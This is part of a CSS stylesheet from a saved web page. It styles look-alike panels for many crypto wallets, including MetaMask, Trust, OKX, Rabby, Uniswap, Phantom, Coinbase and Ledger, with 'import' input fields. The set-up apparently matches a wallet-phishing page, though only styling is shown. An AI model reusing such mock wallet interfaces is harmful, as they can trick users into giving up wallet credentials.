  font-size: 14px;
  font-weight: 400;
  color: rgb(125 125 125);
}

.uniswapinput {
  font-family: "Inter", sans-serif;
  height: 44px;
  width: 100%;
  border-radius: 16px;
  border: 1px solid #2222220d;
  font-size: 14px;
  padding: 11px 8px 11px 40px;
  font-weight: 500;
  color: rgb(34 34 34);
  outline: 2px solid transparent;
  outline-offset: 2px;
}

.uniswapimportbutbox {
  margin-top: 1rem;
  display: flex;
  align-items: center;
  justify-content: center;
  column-gap: 0.25rem;
  padding: 0 1rem;
}

.uniswapimportbut {
  font-family: "Inter", sans-serif;
  width: 100%;
  border-radius: 16px;
  background: rgb(252 114 255);
  padding: 10px 16px;
  font-size: 16px;
  font-weight: 500;
  color: white;
}

.uniswapimportbut:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.uniswapinpurnumbox {
  margin-top: 16px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.uniswapinpurnumbbut {
  display: flex;
  width: 100%;
  background: transparent;
  align-items: center;
  justify-content: center;
  column-gap: 0.25rem;
}

.uniswapinpurnumtxt {
  display: block;
  font-family: "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: rgb(125 125 125);
}

.uniswapinpurnumsvgbox {
  transition: all 0.15s;
  transform: rotate(270deg);
}

.uniswapinpurnumsvgboxs {
  transition: all 0.15s;
  transform: rotate(90deg);
}

.uniswapinpurnumsvg {
  height: auto;
  width: 20px;
  color: rgb(125 125 125);
}

.scwtw-hidden {
  display: none;
}

.op0 {
  opacity: 0;
  z-index: 0;
  transition: all 0.2s ease 0.2s;
}

@keyframes uniswap-bounce {
  0%,
  100% {
    transform: scale(1);
  }
  50% {
    transform: scale(1.1);
  }
}

@keyframes uniswap-pulse {
  0% {
    box-shadow: 0 0 0 0 rgba(252, 114, 255, 0.4);
  }
  70% {
    box-shadow: 0 0 0 10px rgba(252, 114, 255, 0);
  }
  100% {
    box-shadow: 0 0 0 0 rgba(252, 114, 255, 0);
  }
}

@keyframes logoPulse {
  0% {
    transform: scale(1);
  }

  40% {
    transform: scale(0.8);
  }
  80% {
    transform: scale(0.8);
  }
  100% {
    transform: scale(1);
  }
}

@keyframes rabby-bounce {
  0%,
  100% {
    transform: translateY(0);
    animation-timing-function: cubic-bezier(0.8, 0, 1, 1);
  }

  50% {
    transform: translateY(-20px);
    animation-timing-function: cubic-bezier(0, 0, 0.2, 1);
  }
}

@keyframes rabbyComplexBounceExtra {
  0% {
    transform: translateY(0) translateX(0) rotate(0deg) scale(1);
    opacity: 1;
  }

  15% {
    transform: translateY(-30px) translateX(8px) rotate(6deg) scale(1.08);
    opacity: 0.75;
  }
  30% {
    transform: translateY(-5px) translateX(-4px) rotate(-4deg) scale(0.95);
    opacity: 0.9;
  }
  45% {
    transform: translateY(-35px) translateX(6px) rotate(5deg) scale(1.06);
    opacity: 0.7;
  }
  60% {
    transform: translateY(-8px) translateX(-3px) rotate(-3deg) scale(0.97);
    opacity: 0.85;
  }
  75% {
    transform: translateY(-25px) translateX(5px) rotate(4deg) scale(1.04);
    opacity: 0.8;
  }
  90% {
    transform: translateY(-3px) translateX(-2px) rotate(-2deg) scale(0.98);
    opacity: 0.95;
  }
  100% {
    transform: translateY(0) translateX(0) rotate(0deg) scale(1);
    opacity: 1;
  }
}

@keyframes textFade {
  0%,
  100% {
    opacity: 1;
  }

  50% {
    opacity: 0.7;
  }
}

@keyframes ledgerPulse {
  0%,
  100% {
    opacity: 1;
    transform: scale(1);
  }

  50% {
    opacity: 0.8;
    transform: scale(0.95);
  }
}

@keyframes ghost-float {
  0% {
    opacity: 0;
    transform: translateY(20px) translateX(-10px) rotate(-5deg) scale(0.9);
    filter: drop-shadow(0 0 2px rgba(255, 255, 255, 0.2));
  }
  10% {
    opacity: 1;
    transform: translateY(-15px) translateX(5px) rotate(3deg) scale(1);
  }
  30% {
    transform: translateY(0px) translateX(-5px) rotate(-3deg) scale(1.05);
    filter: drop-shadow(0 0 5px rgba(255, 255, 255, 0.5));
  }
  50% {
    transform: translateY(-10px) translateX(5px) rotate(2deg) scale(1);
    filter: drop-shadow(0 0 2px rgba(255, 255, 255, 0.2));
  }
  70% {
    transform: translateY(0px) translateX(0px) rotate(-1deg) scale(1.02);
    filter: drop-shadow(0 0 5px rgba(255, 255, 255, 0.5));
  }
  90% {
    opacity: 1;
    transform: translateY(-7px) translateX(-3px) rotate(1deg) scale(1.01);
  }
  100% {
    opacity: 1;
    transform: translateY(20px) translateX(-10px) rotate(-5deg) scale(0.9);
    filter: drop-shadow(0 0 2px rgba(255, 255, 255, 0.2));
  }
}

@keyframes pulseTrust {
  0% {
    transform: scale(1);
    filter: brightness(1);
  }
  50% {
    transform: scale(1.05);
    filter: brightness(1.3);
  }
  100% {
    transform: scale(1);
    filter: brightness(1);
  }
}

@keyframes fadeInOut {
  0% {
    opacity: 1;
  }

  100% {
    opacity: 0.7;
  }
}

@keyframes scwtw-spin {
  100% {
    transform: rotate(360deg);
  }
}

@keyframes rotate {
  0% {
    background-position: 0% 50%;
  }

  50% {
    background-position: 100% 50%;
  }
  100% {
    background-position: 0% 50%;
  }
}

/* font */
@font-face {
  font-family: "Atyp";
  src: /*savepage-url=../AtypDisplayTRIAL-Bold-BF65727125c8d1d.otf*/ url()
    format("opentype");
  font-weight: 700;
  font-style: normal;
  /*savepage-font-display=swap*/
}

@font-face {
  font-family: "Atyp";
  src: /*savepage-url=../AtypDisplayTRIAL-Medium-BF65727125b8683.otf*/ url()
    format("opentype");
  font-weight: 500;
  font-style: normal;
  /*savepage-font-display=swap*/
}

@font-face {
  font-family: "Atyp ";
  src: /*savepage-url=../AtypTextTRIAL-Bold-BF65727125ceed1.otf*/ url()
    format("opentype");
  font-weight: 700;
  font-style: normal;
  /*savepage-font-display=swap*/
}

@media (min-width: 768px) {
  .walletslist {
    max-height: 350px;
  }

  .walletsli {
    padding-right: 0.375rem;
  }

  .Metamaskbox {
    border: 1px solid rgb(234 236 239);
    width: 430px;
    height: 640px;
    overflow-y: hidden;
  }

  .trustbox {
    width: 358px;
    height: 678px;
  }

  .okxbox {
    width: 358px;
    height: 678px;
  }

  .Rabbybox {
    width: 358px;
    height: 678px;
  }

  .uniswapbox {
    width: 358px;
    height: 678px;
  }

  .phantombox {
    border: 1px solid #000;
    width: 360px;
    height: 685px;
    background: #000;
  }

  .coinbasebox {
    border-width: 0;
    width: 370px;
    height: 600px;
  }

  .metamaskimportinput {
    height: 48px;
  }
}

@media screen and (max-width: 991px) {
  .f-section-large {
    padding-top: 92px;
  }

  .f-header-grid {
    grid-template-columns: 1fr;
  }

  .f-header-image-wrapper-tall {
    max-width: none;
    height: 360px;
  }

  .f-image-cover {
    padding-left: 220px;
    padding-right: 220px;
  }

  .f-feature-card-row {
    flex-direction: column;
  }

  .f-feature-card-divider {
    width: 50%;
    height: 1px;
    margin: 32px 0;
  }

  .f-footer-bottom {
    grid-row-gap: 24px;
    flex-direction: column;
  }
}

@media (max-width: 767px) {
  .f-navigation-link {
    padding: 8px 16px;
  }

  .f-image-cover {
    padding-left: 100px;
    padding-right: 100px;
  }

  .f-section-large {
    padding-top: 72px;
    padding-bottom: 72px;
  }

  .walletscon {
    width: 100%;
    left: 0;
    bottom: 0;
    top: auto;
    transform: translate(0, 0);
  }

  .walletsbc {
    width: 100%;
    height: 621px;
  }

  .walletsflex {
    flex-direction: column;
  }

  .walletsleft {
    flex-basis: 100%;
  }

  .walletsright {
    flex-basis: 100%;
  }

  .walletslist {
    height: 300px;
  }

  .Metamaskbox {
    width: 100%;
    height: 100vh;
    right: 0;
  }

  .phantombox {
    border: 1px solid #000;
    background: #000;
  }

  .Ledgerbox {
    width: 100%;
    height: 100vh;
    top: 0;
    left: 0;
    transform: translate(0, 0);
  }
}
</style>
